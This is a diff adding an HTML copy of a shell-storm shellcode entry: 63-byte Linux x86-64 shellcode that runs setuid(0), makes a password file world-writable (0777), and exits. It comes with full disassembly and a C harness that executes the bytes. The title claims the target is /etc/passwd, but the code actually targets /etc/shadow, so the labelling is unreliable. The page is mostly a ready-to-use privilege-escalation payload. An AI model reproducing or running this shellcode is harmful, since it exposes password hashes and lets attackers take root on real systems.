@@ -1,0 +1,75 @@
+<html><head><title>Linux/x86-64 - setuid(0) &amp; chmod (/etc/passwd, 0777) &amp; exit(0) - 63 byes</title>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta http-equiv="Content-Language" content="en" />
+</head>
+
+
+<pre>
+/*
+Title:  Linux/x86-64 - setuid(0) &amp; chmod (&quot;/etc/passwd&quot;, 0777) &amp; exit(0) - 63 byes
+Date:   2010-06-17
+Tested: Archlinux x86_64 k2.6.33
+
+Author: Jonathan Salwan
+Web:    http://shell-storm.org | http://twitter.com/jonathansalwan
+
+! Database of shellcodes http://www.shell-storm.org/shellcode/
+
+
+
+  &lt;-- _setuid(0) --&gt;
+  400078:	48 31 ff             	xor    %rdi,%rdi
+  40007b:	48 31 c0             	xor    %rax,%rax
+  40007e:	b0 69                	mov    $0x69,%al
+  400080:	0f 05                	syscall
+
+  &lt;-- _chmod(&quot;/etc/shadow&quot;, 0777) --&gt;
+  400082:	48 31 d2             	xor    %rdx,%rdx
+  400085:	66 be ff 01          	mov    $0x1ff,%si
+  400089:	48 bb ff ff ff ff ff 	mov    $0x776f64ffffffffff,%rbx
+  400090:	64 6f 77 
+  400093:	48 c1 eb 28          	shr    $0x28,%rbx
+  400097:	53                   	push   %rbx
+  400098:	48 bb 2f 65 74 63 2f 	mov    $0x6168732f6374652f,%rbx
+  40009f:	73 68 61 
+  4000a2:	53                   	push   %rbx
+  4000a3:	48 89 e7             	mov    %rsp,%rdi
+  4000a6:	48 31 c0             	xor    %rax,%rax
+  4000a9:	b0 5a                	mov    $0x5a,%al
+  4000ab:	0f 05                	syscall 
+
+  &lt;-- _exit(0) --&gt;
+  4000ad:	48 31 ff             	xor    %rdi,%rdi
+  4000b0:	48 31 c0             	xor    %rax,%rax
+  4000b3:	b0 3c                	mov    $0x3c,%al
+  4000b5:	0f 05                	syscall
+*/
+
+#include &lt;stdio.h&gt;
+
+
+char *SC =  &quot;\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05&quot;
+            &quot;\x48\x31\xd2\x66\xbe\xff\x01\x48\xbb\xff&quot;
+            &quot;\xff\xff\xff\xff\x64\x6f\x77\x48\xc1\xeb&quot;
+            &quot;\x28\x53\x48\xbb\x2f\x65\x74\x63\x2f\x73&quot;
+            &quot;\x68\x61\x53\x48\x89\xe7\x48\x31\xc0\xb0&quot;
+            &quot;\x5a\x0f\x05\x48\x31\xff\x48\x31\xc0\xb0&quot;
+            &quot;\x3c\x0f\x05&quot;;
+
+int main(void)
+{
+        fprintf(stdout,&quot;Length: %d\n&quot;,strlen(SC));
+        (*(void(*)()) SC)();
+return 0;
+}
+
+<body><script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
+</script>
+
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-6809519-1");
+pageTracker._trackPageview();
+} catch(err) {}</script></body></html>
